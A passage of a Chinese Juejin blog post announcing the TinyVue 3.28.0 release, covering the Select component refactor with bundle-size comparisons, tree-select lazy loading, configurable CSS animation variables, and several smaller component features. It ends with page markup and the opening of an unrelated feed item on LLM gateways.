<p>你可以更新 @opentiny/vue@3.28.0 进行体验！</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装最新版本</span>

npm install @opentiny/vue@3.28.0

<span class="hljs-comment"># 或使用 yarn</span>

yarn add @opentiny/vue@3.28.0
</code></pre>
<p>如果遇到问题，可以：</p>
<p><strong>查看 Issue</strong> - 在 GitHub 上搜索相关问题
<strong>提交 Issue</strong> - 如果问题未解决，提交新的 Issue</p>
<h2 data-id="heading-2">三、特性介绍</h2>
<p>下面我们一起来看看都有哪些更新吧！</p>
<h3 data-id="heading-3">选择器组件"家族重组"</h3>
<h4 data-id="heading-4">为什么需要重构？</h4>
<p>Select 组件的现状和问题：</p>
<ul>
<li>Select 组件中耦合了 Tree / Grid 两个重型组件，分别对应下拉树和下拉表格两个特性，render-type="tree" | "grid"</li>
<li>下拉树和下拉表格并不是常态，普通的下拉列表才是常态，这就导致了大量只使用Select简单功能的业务包体积也很大，影响业务性能</li>
<li>依赖了 Select 的组件，比如 Area，间接地等于依赖了 Select / Grid / Tree，导致包体积变大</li>
<li>本来应该依赖基于 Select 组件的组件，比如 Pager，由于 Select 耦合了 tree/grid，因此只能自己实现一个 Select，造成重复代码</li>
</ul>
<p>我们使用 Vite 创建一个空的 Vue 项目，对比下不同情况下构建产物体积情况：</p>








































<table><thead><tr><th/><th>产物体积(css+js, 单位kB)</th><th>gzip之后的产物体积(单位kB)</th></tr></thead><tbody><tr><td>不引入TinyVue组件</td><td>56</td><td>23</td></tr><tr><td>只引入Select组件</td><td>1777</td><td>424</td></tr><tr><td>只引入Tree组件</td><td>789</td><td>190</td></tr><tr><td>只引入Grid组件</td><td>1217</td><td>302</td></tr><tr><td>只引入Button</td><td>310</td><td>91</td></tr><tr><td>只引入Area组件(依赖Select)</td><td>1783</td><td>425</td></tr></tbody></table>
<p>不引入TinyVue组件/只引入Select组件/只引入Tree组件的产物体积对比：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74910485864c44c5a1c6d8a8a6242861~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=C0TDLyuX7rjjULUNH7bjS8pDyf4%3D" alt="1.png" loading="lazy"/></p>
<p>只使用 Area 组件（依赖了Select组件）的产物体积：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/326c0bc716f841e49becc48aad78d46d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=NhguJRaC%2BgogrIlK9u3uhfr2MxU%3D" alt="2.png" loading="lazy"/>
可以看到：</p>
<ul>
<li>只引入 Select 组件，产物里面却同时包含了 tree/grid 两个组件，导致产物体积很大</li>
<li>Area 组件本身只是一个很简单的组件，由于引入了 Select，导致产物体积也非常大</li>
</ul>
<h4 data-id="heading-5">重构目标</h4>
<p>本次重构主要达成以下目标：</p>
<ol>
<li>从 Select 组件中**剥离 Tree / Grid 组件，让业务在单引Select组件时不再包含 tree/grid 两个重型组件</li>
<li>减少业务单引Select组件(包括TinyVue组件中依赖了Select的组件)时的包体积，优化性能</li>
<li>重构完不能引起破坏性变更，不能影响现有业务</li>
</ol>
<h4 data-id="heading-6">重构方案</h4>
<p>为了达成以上目标，我们<strong>设计并实行</strong>了以下重构方案：</p>
<ol>
<li>开发一个新组件 <strong>BaseSelect</strong>，这个组件和 Select 组件的api和功能完全一致，只是移除了 tree/grid 相关api和功能</li>
<li><strong>BaseSelect 组件增加panel插槽</strong>，并设计好panel与reference的沟通机制，让用户可以在panel插槽放置任意内容，<strong>包括tree/grid等组件</strong>，从而实现下拉树、下拉表格等功能</li>
<li><strong>基于 BaseSelect 封装 TreeSelect 组件</strong>，实现下拉树组件</li>
<li><strong>基于 BaseSelect 封装 GridSelect 组件</strong>，实现下拉表格组件</li>
<li>重构 Select，移除原有的 tree/grid 功能，基于 BaseSelect / TreeSeelct / GridSelect 组件进行封装，全新的 Select 组件api和功能与原来的Select组件一模一样，不影响用户使用</li>
<li><strong>开发全新select-wrapper包装器</strong>，包含原本select所有功能用于平替</li>
</ol>
<p>重构后组件关系如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc1341d8b04845bf85ee39f1530468ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=HPnXNaJcJvGh4n%2F%2F%2FlwXoGvnHGA%3D" alt="3.png" loading="lazy"/></p>
<h4 data-id="heading-7">业务性能优化</h4>
<p>使用了 Select 组件的业务，如果想要优化性能，可以：</p>
<ul>
<li>只需要Select基本功能的业务，可以通过全局替换 <code>tiny-select</code> 为 <code>tiny-base-select</code> 来实现性能优化</li>
<li>使用了Select组件下拉树功能的业务，可以通过全局替换 <code>tiny-select</code> 为 <code>tiny-tree-select</code> 来实现性能优化</li>
<li>使用了Select组件下拉表格功能的业务，可以通过全局替换 <code>tiny-select</code> 为 <code>tiny-grid-select</code> 来实现性能优化</li>
<li>如果业务同时使用了下拉树和下拉表格功能，则可以使用 SelectWrapper 组件</li>
</ul>
<h4 data-id="heading-8">场景示例</h4>
<p>仅使用base-select与select组件打包对比<strong>包体积减少50%以上</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b31aaef713564e5d994d5f6a573c50a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=YDLQpxcd9IGmBzglsJBWQx%2BRBAM%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-9">新增功能：懒加载支持</h3>
<p><code>tree-select</code> 现在支持懒加载，想象一下，一个包含 10,000 个节点的树形选择器，以前需要一次性加载所有数据，现在可以按需加载，性能提升不是一点点！</p>
<h4 data-id="heading-10">懒加载的使用场景</h4>
<ol>
<li><strong>大数据量树形结构</strong> - 当树节点数量超过 1000 个时，懒加载可以显著提升性能</li>
<li><strong>动态数据加载</strong> - 数据需要从服务器按需获取</li>
<li><strong>减少初始加载时间</strong> - 只加载用户需要查看的节点</li>
</ol>
<h3 data-id="heading-11">主题动画：一键定制，随心所欲</h3>
<h4 data-id="heading-12">全局动画配置</h4>
<p>为 TinyVue 提供 <strong>全局动效配置能力</strong>，基于 <strong>LESS 与 CSS 变量</strong>，实现以下目标：</p>
<ol>
<li><strong>统一管理</strong>：所有动效集中维护，避免分散定义与重复工作。</li>
<li><strong>全局可控</strong>：通过 CSS 变量统一控制动效的持续时间、延迟、速度等参数。</li>
<li><strong>组件集成</strong>：组件可直接调用统一的动效类名或 <code>@keyframes</code>。</li>
<li><strong>动态可调</strong>：通过覆盖 CSS 变量即可在不同场景下切换动效风格。</li>
</ol>
<h4 data-id="heading-13">全局变量定义</h4>
<p>在 <code>/packages/theme/src/base/vars.less</code> 中统一定义动效变量：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* 蚂蚁线相关配置 */</span>
  <span class="hljs-attr">--tv-motion-ants-shift</span>: 8px;
  <span class="hljs-attr">--tv-motion-ants-speed</span>: 0.8s;

  <span class="hljs-comment">/* 其他动效参数... */</span>
}
</code></pre>
<p>开发者可在组件主题文件中覆盖这些变量：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.copyed-borders</span> {
  <span class="hljs-attr">--tv-motion-ants-shift</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attr">--tv-motion-ants-speed</span>: <span class="hljs-number">1.2s</span>;
}
</code></pre>
<p>也可通过在 <code>/packages/theme/src/base/</code> 下创建 <code>motion-theme.less</code> 来切换全局动效风格：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-attr">--tv-motion-ants-shift</span>: 12px;
  <span class="hljs-attr">--tv-motion-ants-speed</span>: 1.2s;
}
</code></pre>
<h4 data-id="heading-14">动效分类与目录结构</h4>
<p>所有动效存放在 /packages/theme/src/motion/ 目录下，按类型拆分：</p>
<pre><code class="hljs language-scss" lang="scss">motion/
  ├─ fade<span class="hljs-selector-class">.less</span>        <span class="hljs-comment">// 淡入淡出</span>
  ├─ slide<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 滑动</span>
  ├─ zoom<span class="hljs-selector-class">.less</span>        <span class="hljs-comment">// 缩放</span>
  ├─ rotate<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 旋转</span>
  ├─ bounce<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 弹跳</span>
  ├─ scroll<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 滚动</span>
  ├─ stroke<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 描边</span>
  ├─ shine<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 闪烁</span>
  ├─ ants<span class="hljs-selector-class">.less</span>        <span class="hljs-comment">// 蚂蚁线</span>
  ├─ arrow<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 箭头</span>
  ├─ tab<span class="hljs-selector-class">.less</span>         <span class="hljs-comment">// Tab 切换</span>
  ├─ progress<span class="hljs-selector-class">.less</span>    <span class="hljs-comment">// 进度条</span>
  └─ index<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 统一引入</span>
</code></pre>
<h4 data-id="heading-15">动效示例</h4>
<p><strong>1. 淡入淡出 (fade.less)</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-keyword">@keyframes</span> fade-in {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
}

<span class="hljs-keyword">@keyframes</span> fade-out {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; }
}
</code></pre>
<p>组件调用示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.@{fade-prefix-cls}</span> {
  <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">-enter-active</span> {
    <span class="hljs-attribute">animation</span>: <span class="hljs-built_in">var</span>(--tv-motion-fade-speed) fade-in ease-out both;
  }
  <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">-leave-active</span> {
    <span class="hljs-attribute">animation</span>: <span class="hljs-built_in">var</span>(--tv-motion-fade-speed) fade-out ease-in both;
  }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e32a3264c24f4592aca61f393a4709~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=0yDdDHoX9YBWmaZae2br119hQDw%3D" alt="5.gif" loading="lazy"/>
<strong>2. 滑动 (slide.less)</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-keyword">@keyframes</span> slide-left-in {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left)); }
  <span class="hljs-number">50%</span>  { <span class="hljs-attribute">opacity</span>: <span class="hljs-built_in">var</span>(--tv-motion-slide-opacity-mid); <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left-mid)); }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0%</span>); }
}

<span class="hljs-keyword">@keyframes</span> slide-left-out {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0%</span>); }
  <span class="hljs-number">50%</span>  { <span class="hljs-attribute">opacity</span>: <span class="hljs-built_in">var</span>(--tv-motion-slide-opacity-mid); <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left-mid)); }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left)); }
}
</code></pre>
<p>组件调用示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.drawer-slide-left-enter-active</span> {
  <span class="hljs-attribute">animation</span>: slide-left-in <span class="hljs-built_in">var</span>(--tv-motion-slide-speed) linear;
}
<span class="hljs-selector-class">.drawer-slide-left-leave-active</span> {
  <span class="hljs-attribute">animation</span>: slide-left-out <span class="hljs-built_in">var</span>(--tv-motion-slide-speed) linear;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ed3ca24e7d94401a1413356ac6b2e88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=8FKQVILamh8l6Jkd5UtcmmZOzN8%3D" alt="6.gif" loading="lazy"/>
<strong>3. 蚂蚁线 (ants.less，可配置)</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-keyword">@keyframes</span> ants-x {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">background-position</span>: <span class="hljs-built_in">var</span>(--tv-motion-ants-shift, <span class="hljs-number">8px</span>) <span class="hljs-number">0</span>; }
}

<span class="hljs-keyword">@keyframes</span> ants-x-rev {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">background-position</span>: <span class="hljs-built_in">calc</span>(-<span class="hljs-number">1</span> * <span class="hljs-built_in">var</span>(--tv-motion-ants-shift, <span class="hljs-number">8px</span>)) <span class="hljs-number">0</span>; }
}
</code></pre>
<p>组件调用示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-copyed-borders</span> {
  <span class="hljs-attr">--tv-motion-ants-shift</span>: 13px;

  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-top</span> {
    <span class="hljs-attribute">animation</span>: ants-x <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-right</span> {
    <span class="hljs-attribute">animation</span>: ants-y <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-bottom</span> {
    <span class="hljs-attribute">animation</span>: ants-x-rev <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-left</span> {
    <span class="hljs-attribute">animation</span>: ants-y-rev <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d7fb56f009442aa83f9e8f04b70bd45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=b1d1y5ARbyKqAm5ezeEaYKw8M7A%3D" alt="7.gif" loading="lazy"/></p>
<h4 data-id="heading-16">组件集成方式</h4>
<ol>
<li><strong>全局引入</strong>
所有 <code>@keyframes</code> 在 <code>transition.less</code> 与 <code>motion/*</code> 中集中维护，统一加载。</li>
<li><strong>局部调用</strong>
组件可通过 <code>className</code> 或 <code>animation</code> 调用指定动效。</li>
<li><strong>可配置参数</strong>
开发者可通过覆盖 <code>:root</code> 变量调整动效时长、速度等参数。</li>
</ol>
<h2 data-id="heading-17">四、其他重要更新</h2>
<h3 data-id="heading-18">下拉菜单右键支持</h3>
<p><code>dropdown</code> 组件现在支持右键菜单触发了！这对于需要上下文菜单的场景非常有用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b439382f1d1544c9b07e4d7408bcae2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=Xe5eqh4zjDXN4quIQHOlwnXeALI%3D" alt="8.gif" loading="lazy"/></p>
<h4 data-id="heading-19">使用场景</h4>
<p>右键菜单在很多业务场景中都非常常见：</p>
<ul>
<li><strong>表格行操作</strong> - 在表格行上右键显示操作菜单</li>
<li><strong>文件管理</strong> - 文件列表的右键菜单</li>
<li><strong>编辑器</strong> - 文本编辑器的上下文菜单</li>
<li><strong>图形界面</strong> - 画布元素的右键菜单</li>
</ul>
<h4 data-id="heading-20">支持的触发方式</h4>
<ul>
<li><code>click</code> - 点击触发（默认）</li>
<li><code>hover</code> - 悬停触发</li>
<li><code>contextmenu</code> - 右键触发（新功能）</li>
<li><code>focus</code> - 聚焦触发</li>
</ul>
<h3 data-id="heading-21">Switch 组件宽度自定义</h3>
<p><code>switch</code> 组件现在支持自定义宽度了！不再局限于固定的尺寸。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35bc2a281df04845ac721d5fd6abac27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=amUhUsuF5uhGSkAXEHQx8LkE6Ts%3D" alt="9.png" loading="lazy"/></p>
<h4 data-id="heading-22">使用场景</h4>
<p>自定义宽度让你可以：</p>
<ul>
<li><strong>适配不同设计风格</strong> - 根据 UI 设计调整开关大小</li>
<li><strong>提升视觉层次</strong> - 通过不同尺寸区分重要程度</li>
<li><strong>响应式设计</strong> - 在不同屏幕尺寸下使用不同宽度</li>
<li><strong>样式定制</strong> - 配合 CSS，你可以进一步定制开关的样式</li>
</ul>
<h3 data-id="heading-23">Modal 头部拖拽</h3>
<p><code>modal</code> 组件现在支持设置 <code>headerDragable</code> 属性，让用户可以拖拽弹窗头部来移动弹窗位置。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87c97a8bec3a421dae9ae5dacf0ee344~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=%2FwmnK6grPAxA16vMvhpY%2BPROm7w%3D" alt="10.gif" loading="lazy"/></p>
<h4 data-id="heading-24">使用场景</h4>
<p>拖拽功能特别适合：</p>
<ul>
<li><strong>多窗口场景</strong> - 用户可以自由调整弹窗位置，避免遮挡</li>
<li><strong>大屏幕应用</strong> - 在宽屏显示器上，拖拽可以提升操作效率</li>
<li><strong>用户个性化</strong> - 让用户按照自己的习惯摆放弹窗</li>
</ul>
<h4 data-id="heading-25">注意事项</h4>
<ul>
<li>拖拽功能只在弹窗未全屏时生效</li>
<li>拖拽范围受视口限制，不会拖出屏幕</li>
<li>可以通过 CSS 自定义拖拽时的样式</li>
</ul>
<h3 data-id="heading-26">Drawer 按 ESC 关闭</h3>
<p><code>drawer</code> 组件现在支持通过按 `ESC` 键关闭，用户体验更加友好。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be469b7494f54e1da4393acc91897e8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=ezE6TcXDwTdm44wrnmnAjNujIOQ%3D" alt="11.gif" loading="lazy"/></p>
<h4 data-id="heading-27">使用场景</h4>
<p>ESC 键关闭是用户习惯的操作方式：</p>
<ul>
<li><strong>符合用户预期</strong> - 大多数应用都支持 ESC 关闭</li>
<li><strong>提升操作效率</strong> - 键盘操作比鼠标点击更快</li>
<li><strong>无障碍支持</strong> - 方便键盘用户操作</li>
</ul>
<h4 data-id="heading-28">其他关闭方式</h4>
<p>Drawer 组件支持多种关闭方式：</p>
<ul>
<li>点击遮罩层关闭（默认）</li>
<li>点击关闭按钮</li>
<li>按 ESC 键关闭（新功能）</li>
<li>调用 <code>close()</code> 方法</li>
</ul>
<h3 data-id="heading-29">Tree Menu 节点点击增强</h3>
<p><code>tree-menu</code> 组件现在支持在文档中点击添加节点，交互更加直观。</p>
<h4 data-id="heading-30">使用场景</h4>
<p>这个功能特别适合：</p>
<ul>
<li><strong>可视化编辑</strong> - 在文档中直接点击添加节点</li>
<li><strong>快速操作</strong> - 提升节点添加的效率</li>
<li><strong>直观交互</strong> - 所见即所得的编辑体验</li>
</ul>
<h3 data-id="heading-31">Guide 组件触发条件优化</h3>
<p>guide<code>组件现在支持</code>showStep<code>属性，只有在</code>showStep<code>为</code>true` 时才会触发引导。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b40e65bbb19d45a5b0c6a826a8b4405d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=bvLBbtPiUen2787qUVBx3J2Nsgc%3D" alt="12.gif" loading="lazy"/></p>
<h4 data-id="heading-32">使用场景</h4>
<p>这个优化让你可以：</p>
<ul>
<li><strong>条件触发</strong> - 只在特定条件下显示引导</li>
<li><strong>避免干扰</strong> - 不会在用户不需要时弹出</li>
<li><strong>灵活控制</strong> - 根据业务逻辑动态控制引导显示</li>
</ul>
<h2 data-id="heading-33">五、结语</h2>
<p>TinyVue v3.28.0 版本的发布，实现了多项重要升级：对选择器组件家族进行了彻底重构，解耦了 Tree / Grid 等重型功能，显著降低了单个组件的体积；新增了全局主题动画配置，让动画效果可通过 CSS 变量随意定制；引入了懒加载、右键菜单、宽度自定义、弹窗拖拽、ESC 关闭等实用功能，进一步提升了开发体验和用户交互；同时修复了 65+ 个 Bug，整体稳定性大幅提升。通过这些改进，TinyVue 不仅在性能上实现了突破，也为开发者提供了更灵活、可维护的组件库，期待在未来的项目中为你带来更高效、更优雅的开发体验，让我们一起，让前端开发变得更简单、更高效！</p>
<h2 data-id="heading-34">关于OpenTiny</h2>
<p>欢迎加入 OpenTiny 开源社区。添加微信小助手：opentiny-official 一起参与交流前端技术～<br/>
OpenTiny 官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design" target="_blank" title="https://opentiny.design" ref="nofollow noopener noreferrer">opentiny.design</a><br/>
OpenTiny 代码仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny" target="_blank" title="https://github.com/opentiny" ref="nofollow noopener noreferrer">github.com/opentiny</a><br/>
TinyVue源码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue" target="_blank" title="https://github.com/opentiny/tiny-vue" ref="nofollow noopener noreferrer">github.com/opentiny/ti…</a></p>
<p>欢迎进入代码仓库 Star🌟TinyVue、TinyEngine、TinyPro、TinyNG、TinyCLI、TinyEditor
如果你也想要共建，可以进入代码仓库，找到 good first issue标签，一起参与开源贡献~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大模型网关：大模型时代的智能交通枢纽｜得物技术]]></title>    <link>https://juejin.cn/post/7602135278666055732</link>    <guid>https://juejin.cn/post/7602135278666055732</guid>    <pubDate>2026-02-03T06:18:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278666055732" data-draft-id="7602252722373607475" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大模型网关：大模型时代的智能交通枢纽｜得物技术"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-03T06:18:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="得物技术"/> <meta itemprop="url" content="https://juejin.cn/user/2392954206960247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大模型网关：大模型时代的智能交通枢纽｜得物技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392954206960247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    得物技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:18:39.000Z" title="Tue Feb 03 2026 06:18:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 